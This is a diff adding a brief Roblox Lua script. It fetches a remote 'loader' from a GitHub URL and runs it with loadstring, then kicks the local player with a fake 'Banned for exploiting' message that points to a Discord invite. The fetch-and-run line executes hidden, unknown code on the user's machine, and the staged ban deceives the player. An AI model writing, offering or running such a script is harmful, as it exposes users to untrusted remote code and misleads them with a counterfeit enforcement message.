@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rcisback/fethub/main/loader"))()
+
+
+game.Players.LocalPlayer:Kick("Banned for exploiting.Appeal your ban at discord.gg/mm2")
